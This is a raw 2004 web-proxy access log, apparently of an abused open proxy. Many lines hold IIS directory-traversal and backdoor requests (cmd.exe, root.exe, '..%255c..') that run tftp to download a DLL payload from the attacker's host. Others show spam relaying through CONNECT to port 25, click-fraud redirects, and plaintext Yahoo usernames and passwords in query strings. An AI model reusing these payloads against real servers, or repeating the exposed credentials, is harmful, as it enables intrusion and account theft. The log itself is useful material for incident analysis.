195.82.31.125 - - [09/Mar/2004:22:03:09 -0500] "GET http://www.goldengate.hu/cgi-bin/top/topsites.cgi?an12 HTTP/1.0" 200 558 "http://Afrique" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
195.82.31.125 - - [09/Mar/2004:22:03:12 -0500] "POST http://www.goldengate.hu/cgi-bin/top/topsites.cgi HTTP/1.0" 302 284 "http://www.goldengate.hu/cgi-bin/top/topsites.cgi?an12" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
195.82.31.125 - - [09/Mar/2004:22:03:15 -0500] "GET http://toplist.goldengate.hu/ HTTP/1.0" 200 992 "http://www.goldengate.hu/cgi-bin/top/topsites.cgi?an12" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
218.93.92.137 - - [09/Mar/2004:22:04:16 -0500] "GET http://xmlrevenue.com/s.php?username=jenneypan&keywords=Online+Gambling HTTP/1.1" 200 578 "http://www.myshoppingpage.com/index.htm" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
192.117.242.67 - - [09/Mar/2004:22:04:29 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-"
192.117.242.67 - - [09/Mar/2004:22:04:29 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-"
192.117.242.67 - - [09/Mar/2004:22:07:11 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-"
203.121.182.190 - - [09/Mar/2004:22:07:16 -0500] "\x04\x01" 501 - "-" "-"
61.172.244.109 - - [09/Mar/2004:22:08:13 -0500] "CONNECT 195.228.231.51:25 HTTP/1.0" 500 434 "-" "-"
203.61.199.63 - - [09/Mar/2004:22:08:53 -0500] "GET http://hpcgi1.com/trino/ProxyJ/prxjdg.cgi HTTP/1.0" 500 428 "-" "Mozilla/3.0 (compatible)"
203.121.182.141 - - [09/Mar/2004:22:09:34 -0500] "CONNECT 202.96.254.200:25 HTTP/1.0" 200 - "-" "-"
192.117.242.67 - - [09/Mar/2004:22:09:38 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-"
192.117.242.67 - - [09/Mar/2004:22:09:38 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-"
212.57.187.242 - - [09/Mar/2004:22:11:07 -0500] "GET http://www.ya.ru/ HTTP/1.1" 200 1346 "http://www.ya.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.03  [en]"
212.57.187.242 - - [09/Mar/2004:22:11:27 -0500] "GET https://www.chel.mts.ru/sms/cgi-bin/cgi_.exe?function=sms_send HTTP/1.1" 200 23501 "http://www.ya.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.03  [en]"
24.168.72.174 - - [09/Mar/2004:22:11:38 -0500] "GET http://sbc1.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=exodus_510&passwd=matthew HTTP/1.0" 200 566 "-" "-"
192.117.242.67 - - [09/Mar/2004:22:12:19 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-"
218.78.209.42 - - [09/Mar/2004:22:12:33 -0500] "CONNECT 209.15.20.26:25 HTTP/1.0" 200 - "-" "-"
203.121.182.145 - - [09/Mar/2004:22:12:55 -0500] "CONNECT 211.22.130.68:25 HTTP/1.0" 200 - "-" "-"
195.116.208.249 - - [09/Mar/2004:22:13:30 -0500] "GET http://sit0.com/foo.php HTTP/1.1" 200 84 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
195.116.208.249 - - [09/Mar/2004:22:13:30 -0500] "CONNECT www.bzwbk.pl:443 HTTP/1.1" 400 381 "-" "-"
195.116.208.249 - - [09/Mar/2004:22:13:30 -0500] "CONNECT wacek.one.pl:2019 HTTP/1.1" 400 381 "-" "-"
195.116.208.249 - - [09/Mar/2004:22:13:39 -0500] "GET http://sit0.com/foo.php HTTP/1.1" 200 84 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
195.116.208.249 - - [09/Mar/2004:22:13:39 -0500] "CONNECT www.bzwbk.pl:443 HTTP/1.1" 400 381 "-" "-"
195.116.208.249 - - [09/Mar/2004:22:13:40 -0500] "CONNECT wacek.one.pl:2019 HTTP/1.1" 400 381 "-" "-"
212.160.132.1 - - [09/Mar/2004:22:13:43 -0500] "GET http://140.99.44.61/cgi-bin/jenv.cgi HTTP/1.0" 200 965 "-" "fork()"
212.160.132.1 - - [09/Mar/2004:22:13:43 -0500] "CONNECT www.microsoft.com:80 HTTP/1.0" 200 - "-" "-"
203.61.199.63 - - [09/Mar/2004:22:13:50 -0500] "GET http://hpcgi1.nifty.com/trino/PoxyJ/prxjdg.cgi HTTP/1.0" 404 4830 "-" "Mozilla/3.0 (compatible)"
203.121.182.139 - - [09/Mar/2004:22:13:59 -0500] "CONNECT 218.234.19.62:25 HTTP/1.0" 200 - "-" "-"
192.117.242.67 - - [09/Mar/2004:22:14:42 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-"
192.117.242.67 - - [09/Mar/2004:22:14:42 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-"
192.117.242.67 - - [09/Mar/2004:22:17:22 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-"
61.172.244.232 - - [09/Mar/2004:22:17:51 -0500] "CONNECT 213.81.227.129:25 HTTP/1.0" 500 436 "-" "-"
24.168.72.174 - - [09/Mar/2004:22:19:33 -0500] "GET http://login.europe.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=exodus_$$$$$$$&passwd=matthew HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:19:35 -0500] "GET /scripts/root.exe?/c+dir HTTP/1.0" 200 566 "-" "-"
192.117.242.67 - - [09/Mar/2004:22:19:36 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-"
192.117.242.67 - - [09/Mar/2004:22:19:41 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-"
68.48.142.117 - - [09/Mar/2004:22:20:26 -0500] "GET /scripts/root.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:20:26 -0500] "GET /scripts/httpodbc.dll HTTP/1.0" 404 288 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:21:16 -0500] "GET /MSADC/root.exe?/c+dir HTTP/1.0" 200 566 "-" "-"
218.93.92.137 - - [09/Mar/2004:22:21:38 -0500] "GET http://seekpond.com/search.php?username=johnbush&keywords=ads HTTP/1.1" 200 578 "http://www.psend.com/users/mysearch/seekpond.htm" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)"
68.48.142.117 - - [09/Mar/2004:22:22:07 -0500] "GET /MSADC/root.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:22:07 -0500] "GET /MSADC/httpodbc.dll HTTP/1.0" 404 286 "-" "-"
61.53.76.40 - - [09/Mar/2004:22:22:13 -0500] "POST http://69.59.175.60/found-best.com/search.php HTTP/1.0" 502 556 "http://www.aprilgoldsgetpaid2reademail.com/pages/ptc.php" "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.0)"
192.117.242.67 - - [09/Mar/2004:22:22:33 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-"
68.48.142.117 - - [09/Mar/2004:22:22:57 -0500] "GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-"
61.172.244.109 - - [09/Mar/2004:22:23:27 -0500] "CONNECT 69.46.18.186:25 HTTP/1.0" 200 - "-" "-"
68.48.142.117 - - [09/Mar/2004:22:23:48 -0500] "GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.134.160.117 - - [09/Mar/2004:22:24:27 -0500] "GET http://www.glocksoft.net/cgi-bin/jenv.cgi HTTP/1.0" 200 1169 "-" "Mozilla/4.0"
68.48.142.117 - - [09/Mar/2004:22:24:38 -0500] "GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
192.117.242.67 - - [09/Mar/2004:22:24:44 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-"
192.117.242.67 - - [09/Mar/2004:22:24:45 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-"
212.160.136.163 - - [09/Mar/2004:22:24:57 -0500] "GET http://www.xboss.us/search.php?str=online+gambling HTTP/1.0" 302 2 "-" "Mozilla/4.0 (compatible; MSIE 5.02; Windows NT 5.0)"
212.160.136.163 - - [09/Mar/2004:22:25:01 -0500] "GET http://www.xboss.us/proxy.html HTTP/1.0" 200 1371 "-" "Mozilla/4.0 (compatible; MSIE 5.02; Windows NT 5.0)"
68.48.142.117 - - [09/Mar/2004:22:25:28 -0500] "GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:25:28 -0500] "GET /c/httpodbc.dll HTTP/1.0" 404 282 "-" "-"
218.93.92.137 - - [09/Mar/2004:22:25:32 -0500] "GET http://www.appliedsearch.net/Searchit?search&afID=2165&keywords=Program HTTP/1.1" 200 578 "http://www.myshoppingpage.com/" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0"
203.121.182.139 - - [09/Mar/2004:22:26:05 -0500] "CONNECT 213.3.5.219:25 HTTP/1.0" 200 - "-" "-"
68.48.142.117 - - [09/Mar/2004:22:26:19 -0500] "GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-"
210.72.122.162 - - [09/Mar/2004:22:26:36 -0500] "GET /scripts/nsiislog.dll" 404 - "-" "-"
68.48.142.117 - - [09/Mar/2004:22:27:09 -0500] "GET /d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
61.172.244.232 - - [09/Mar/2004:22:27:29 -0500] "CONNECT 61.137.101.4:25 HTTP/1.0" 200 - "-" "-"
24.168.72.174 - - [09/Mar/2004:22:27:46 -0500] "GET http://sbc2.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=exodusc&passwd=HELL HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:28:02 -0500] "GET /d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
203.121.182.140 - - [09/Mar/2004:22:28:44 -0500] "CONNECT 209.15.20.87:25 HTTP/1.0" 200 - "-" "-"
68.48.142.117 - - [09/Mar/2004:22:28:53 -0500] "GET /d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:28:53 -0500] "GET /d/httpodbc.dll HTTP/1.0" 404 282 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:29:43 -0500] "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-"
192.117.242.67 - - [09/Mar/2004:22:29:46 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-"
192.117.242.67 - - [09/Mar/2004:22:29:54 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-"
220.173.17.142 - - [09/Mar/2004:22:30:24 -0500] "POST http://www.clickcheaper.com/search.php HTTP/1.1" 200 19044 "http://www.163.net" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
220.173.17.142 - - [09/Mar/2004:22:30:26 -0500] "GET http://clickcheaper.com/go.php?b=zhhhzzzizyzohchzhdzy&k=acasadsmayaoac&u=znhpzzzvsaasad&l=acasadsmayaoacdhzkhpspansyassscmcoxoafakssafanshzmzxhyzxhyazsoaxaksxsnsdaxafahavaksmaiakasafaiavaadfskcmzasksiszzyhcsiapayahaxzyzazahddvzdzxszsmzazpzdhfzhzmhszhzvzphhsicixoahsvsfsosyaohvakapsdacfpzphdahaksfdazchnskapszazhdspafahayaoaadpfxfnafscspfkzmzahdzphnsnhhsfsnazscsvakaphmaxaoafdhhchnfihzhnddzmzadkdndyaazfsdzcapakzxskaaafazzkzyzkhxamssadzfzyhpsmhkhsadhfhkzoznzizvcickcphahfsmzisvacakayhphzapspsyashysmspsihdzkzpakszsxzcaiaiadhmazaifyfodkhvavzaaksdspsyhphahxzhavananaihhadhvacsxavhkhchczhzfsvzcaksfspxmdvfpsfsvafansvhvhaaxzdzhzaahhxskazaksvafhpsxahsnznsdayscasaksyhcskdxdhxxzmzhavapakaa&s=axsssismazfp&t= HTTP/1.1" 302 0 "http://www.clickcheaper.com/search.php" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
220.173.17.142 - - [09/Mar/2004:22:30:29 -0500] "GET http://clickcheaper.com/go.php?u=znhpzzzvsaasad&l=acasadsmayaoacdhzkhpspansyassscmcoxoafakssafanshzmzxhyzxhyazsoaxaksxsnsdaxafahavaksmaiakasafaiavaadfskcmzasksiszzyhcsiapayahaxzyzazahddvzdzxszsmzazpzdhfzhzmhszhzvzphhsicixoahsvsfsosyaohvakapsdacfpzphdahaksfdazchnskapszazhdspafahayaoaadpfxfnafscspfkzmzahdzphnsnhhsfsnazscsvakaphmaxaoafdhhchnfihzhnddzmzadkdndyaazfsdzcapakzxskaaafazzkzyzkhxamssadzfzyhpsmhkhsadhfhkzoznzizvcickcphahfsmzisvacakayhphzapspsyashysmspsihdzkzpakszsxzcaiaiadhmazaifyfodkhvavzaaksdspsyhphahxzhavananaihhadhvacsxavhkhchczhzfsvzcaksfspxmdvfpsfsvafansvhvhaaxzdzhzaahhxskazaksvafhpsxahsnznsdayscasaksyhcskdxdhxxzmzhavapakaa&k=acasadsmayaoac&b=zhhhzzzizyzohchzhdzy&s=axsssismazfp&x=&t=&tw=&f=85e9b5a1ba9a613de01a0d3c470f76bb HTTP/1.1" 302 0 "http://www.clickcheaper.com/search.php" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
220.173.17.142 - - [09/Mar/2004:22:30:30 -0500] "GET http://www.epilot.com/click.aspx?k=cruises&b=820&p=kanoodle&s=seeky&pos=3&sid=ee77ec1d-5211-4508-a48f-27dcf3865349&l=http%3A%2F%2Fwww.kanoodle.com%2Fclickthrough.cool%3Feid%3D1%26clickid%3D12486486%26id%3D77840372%26lid%3Dbhnnbinnbknobonkbmngbknjbonnbmni%26query%3Dcruises HTTP/1.1" 302 387 "http://www.clickcheaper.com/search.php" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
220.173.17.142 - - [09/Mar/2004:22:30:33 -0500] "GET http://www.kanoodle.com/clickthrough.cool?eid=1&clickid=12486486&id=77840372&lid=bhnnbinnbknobonkbmngbknjbonnbmni&query=cruises HTTP/1.1" 301 320 "http://www.clickcheaper.com/search.php" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
68.48.142.117 - - [09/Mar/2004:22:30:34 -0500] "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
220.173.17.142 - - [09/Mar/2004:22:30:46 -0500] "GET http://www.bestpricecruises.com/ HTTP/1.1" 200 44057 "http://www.clickcheaper.com/search.php" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
68.48.142.117 - - [09/Mar/2004:22:31:24 -0500] "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
217.136.205.206 - - [09/Mar/2004:22:32:07 -0500] "GET http://members.asstraffic.com/secure/pages/index.php HTTP/1.0" 200 566 "http://members.asstraffic.com:80" "Mozilla/4.7 ( compatible; [en]; Windows 95; win9x/NT 4.90 )"
68.48.142.117 - - [09/Mar/2004:22:32:15 -0500] "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
192.117.242.67 - - [09/Mar/2004:22:32:39 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-"
68.48.142.117 - - [09/Mar/2004:22:33:00 -0500] "GET /scripts/root.exe?/c+dir HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:33:05 -0500] "GET /scripts/..%255c../httpodbc.dll HTTP/1.0" 200 566 "-" "-"
203.121.182.142 - - [09/Mar/2004:22:33:17 -0500] "CONNECT 219.88.69.100:25 HTTP/1.0" 200 - "-" "-"
68.48.142.117 - - [09/Mar/2004:22:33:50 -0500] "GET /scripts/root.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:33:50 -0500] "GET /scripts/httpodbc.dll HTTP/1.0" 404 288 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:33:55 -0500] "GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:34:41 -0500] "GET /MSADC/root.exe?/c+dir HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:34:46 -0500] "GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
192.117.242.67 - - [09/Mar/2004:22:34:47 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-"
68.48.142.117 - - [09/Mar/2004:22:35:31 -0500] "GET /MSADC/root.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:35:31 -0500] "GET /MSADC/httpodbc.dll HTTP/1.0" 404 286 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:35:36 -0500] "GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
24.168.72.174 - - [09/Mar/2004:22:35:48 -0500] "GET http://sbc2.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=exodus_!!!!!!!!&passwd=HELL HTTP/1.0" 200 566 "-" "-"
217.229.136.208 - - [09/Mar/2004:22:35:55 -0500] "GET http://217.229.136.208/members/sex/fuck/id000047id/lund4050lundxxx.html HTTP/1.0" 401 0 "-" "-"
217.136.205.206 - - [09/Mar/2004:22:36:02 -0500] "GET http://members.asstraffic.com/secure/pages/index.php HTTP/1.0" 200 566 "http://www.clubsandy.com/" "Mozilla/4.73 ( compatible; MSIE 5.01; Windows NT4.0; DigiExt )"
217.229.136.208 - - [09/Mar/2004:22:36:02 -0500] "CONNECT 217.229.136.208:80 HTTP/1.0" 200 - "-" "-"
217.136.205.206 - - [09/Mar/2004:22:36:07 -0500] "GET http://members.asstraffic.com/secure/pages/index.php HTTP/1.0" 200 566 "http://www.clubsandy.com/" "Mozilla/5.0 ( compatible; [en]; Windows 98; NetCaptor )"
217.136.205.206 - - [09/Mar/2004:22:36:11 -0500] "GET http://members.asstraffic.com/secure/pages/index.php HTTP/1.0" 200 566 "http://www.clubsandy.com/" "Mozilla/5.0 ( compatible; [dk]; Windows 98; DigiExt )"
68.48.142.117 - - [09/Mar/2004:22:36:21 -0500] "GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:36:26 -0500] "GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:37:11 -0500] "GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:37:17 -0500] "GET /_vti_bin/..%255c../..%255c../..%255c../httpodbc.dll HTTP/1.0" 200 566 "-" "-"
192.117.242.67 - - [09/Mar/2004:22:37:29 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-"
203.61.199.15 - - [09/Mar/2004:22:37:46 -0500] "GET http://hpcgi1.nifty.com/trino/ProxyJ/prxjdg.cgi HTTP/1.0" 200 2030 "-" "Mozilla/3.0 (compatible)"
68.48.142.117 - - [09/Mar/2004:22:38:04 -0500] "GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:38:09 -0500] "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-"
24.130.219.48 - - [09/Mar/2004:22:38:23 -0500] "HEAD http://members.meganqt.com/ HTTP/1.0" 200 0 "-" "Mozilla/4.0 (compatible; ICS)"
220.173.17.142 - - [09/Mar/2004:22:38:47 -0500] "POST http://www.clickcheaper.com/search.php HTTP/1.1" 200 17320 "http://www.163.net" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
203.121.182.189 - - [09/Mar/2004:22:38:48 -0500] "CONNECT 69.56.234.22:25 HTTP/1.0" 200 - "-" "-"
220.173.17.142 - - [09/Mar/2004:22:38:52 -0500] "GET http://clickcheaper.com/go.php?b=znhzzxzyzxznznhz&k=acassismanapaiscapaxsn&u=sfasasapsdsksv&l=acassismanapaiscapaxsnfizkhosndnfodssszvznhnamshhdzxzmzxzhazsdaxaisxadsdsyafsdavszsmszakakafsvavafdfdkdvaaasfmzkhiahhyhaakazsfzdzszshohnzhhfzffizzhoaxafzmzozdzmzhzihfchcmcphhfkzvhnsnafhahnhkhyhxzozmhdhhdvzdzxszsmshfmhhzaszaoszsohdsoasdhdodoaaansfsosyaohvxmapsdhoavsvhnacaasassaxaiavssznskaxahdhzyhnfmhcxnaacmzaaiaoapsihvhsadzmhizvhosmzdhzhpsfhzapsoshzvhyhchszkhxziafhhhzfifkcizvsisnzmzyzvhpavavzvakzyzmavhvavscszzkaksoaczshczsavszakzcamakddxvdzaisosnamzzsfafzmhfznsasvsssxscspaasisozsazzdshakadhvhczyzkzhsmccdiffsphvaisyssafzczphfzzzsadaxzmaihxamsaadadhvssacafszsyzvsxaysnzpdpdofaafaisnhdadskzdsxsxaizzaiaksd&s=axsssismazfp&t= HTTP/1.1" 302 0 "http://www.clickcheaper.com/search.php" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
68.48.142.117 - - [09/Mar/2004:22:38:55 -0500] "GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:38:55 -0500] "GET /c/httpodbc.dll HTTP/1.0" 404 282 "-" "-"
61.172.244.109 - - [09/Mar/2004:22:38:56 -0500] "CONNECT 200.91.211.4:25 HTTP/1.0" 500 430 "-" "-"
220.173.17.142 - - [09/Mar/2004:22:38:56 -0500] "GET http://clickcheaper.com/go.php?u=sfasasapsdsksv&l=acassismanapaiscapaxsnfizkhosndnfodssszvznhnamshhdzxzmzxzhazsdaxaisxadsdsyafsdavszsmszakakafsvavafdfdkdvaaasfmzkhiahhyhaakazsfzdzszshohnzhhfzffizzhoaxafzmzozdzmzhzihfchcmcphhfkzvhnsnafhahnhkhyhxzozmhdhhdvzdzxszsmshfmhhzaszaoszsohdsoasdhdodoaaansfsosyaohvxmapsdhoavsvhnacaasassaxaiavssznskaxahdhzyhnfmhcxnaacmzaaiaoapsihvhsadzmhizvhosmzdhzhpsfhzapsoshzvhyhchszkhxziafhhhzfifkcizvsisnzmzyzvhpavavzvakzyzmavhvavscszzkaksoaczshczsavszakzcamakddxvdzaisosnamzzsfafzmhfznsasvsssxscspaasisozsazzdshakadhvhczyzkzhsmccdiffsphvaisyssafzczphfzzzsadaxzmaihxamsaadadhvssacafszsyzvsxaysnzpdpdofaafaisnhdadskzdsxsxaizzaiaksd&k=acassismanapaiscapaxsn&b=znhzzxzyzxznznhz&s=axsssismazfp&x=&t=&tw=&f=62683599fe13f479160d189c8e3ae8fc HTTP/1.1" 302 0 "http://www.clickcheaper.com/search.php" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
220.173.17.142 - - [09/Mar/2004:22:38:57 -0500] "GET http://www.epilot.com/click.aspx?k=automobiles&b=320&p=kanoodle&s=seeky&pos=2&sid=b249b11f-66ef-4dd0-b111-291ecb6e205e&l=http%3A%2F%2Fwww.kanoodle.com%2Fclickthrough.cool%3Feid%3D1%26clickid%3D12486486%26id%3D70509698%26lid%3Dbhnnbingbknlbongbmnpbknmbonpbmno%26query%3Dautomobiles HTTP/1.1" 302 391 "http://www.clickcheaper.com/search.php" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
220.173.17.142 - - [09/Mar/2004:22:38:58 -0500] "GET http://www.kanoodle.com/clickthrough.cool?eid=1&clickid=12486486&id=70509698&lid=bhnnbingbknlbongbmnpbknmbonpbmno&query=automobiles HTTP/1.1" 301 363 "http://www.clickcheaper.com/search.php" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
61.172.244.112 - - [09/Mar/2004:22:38:59 -0500] "CONNECT 209.15.20.91:25 HTTP/1.0" 200 - "-" "-"
68.48.142.117 - - [09/Mar/2004:22:39:00 -0500] "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
220.173.17.142 - - [09/Mar/2004:22:39:06 -0500] "GET http://www.carsdirect.com/home?partner=kano&customerid=agx~automobiles HTTP/1.1" 200 25085 "http://www.clickcheaper.com/search.php" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
195.116.208.249 - - [09/Mar/2004:22:39:19 -0500] "GET http://sit0.com/foo.php HTTP/1.1" 200 84 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
195.116.208.249 - - [09/Mar/2004:22:39:19 -0500] "CONNECT www.bzwbk.pl:443 HTTP/1.1" 400 381 "-" "-"
195.116.208.249 - - [09/Mar/2004:22:39:19 -0500] "CONNECT wacek.one.pl:2019 HTTP/1.1" 400 381 "-" "-"
195.116.208.249 - - [09/Mar/2004:22:39:28 -0500] "GET http://sit0.com/foo.php HTTP/1.1" 200 84 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
195.116.208.249 - - [09/Mar/2004:22:39:28 -0500] "CONNECT www.bzwbk.pl:443 HTTP/1.1" 400 381 "-" "-"
195.116.208.249 - - [09/Mar/2004:22:39:29 -0500] "CONNECT wacek.one.pl:2019 HTTP/1.1" 400 381 "-" "-"
220.173.17.142 - - [09/Mar/2004:22:39:32 -0500] "GET http://media.imatchup.com/images/affiliates/getbanner.asp?affid=240&bannerid=8&accountid=90&websiteid=2 HTTP/1.1" 200 0 "http://www.so123.com" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
68.48.142.117 - - [09/Mar/2004:22:39:45 -0500] "GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:39:53 -0500] "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
192.117.242.67 - - [09/Mar/2004:22:39:54 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-"
192.117.242.67 - - [09/Mar/2004:22:39:57 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-"
66.46.181.116 - - [09/Mar/2004:22:40:07 -0500] "GET / HTTP/1.0" 200 4301 "http://Network-Tools.com" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0; AspTear 1.5)"
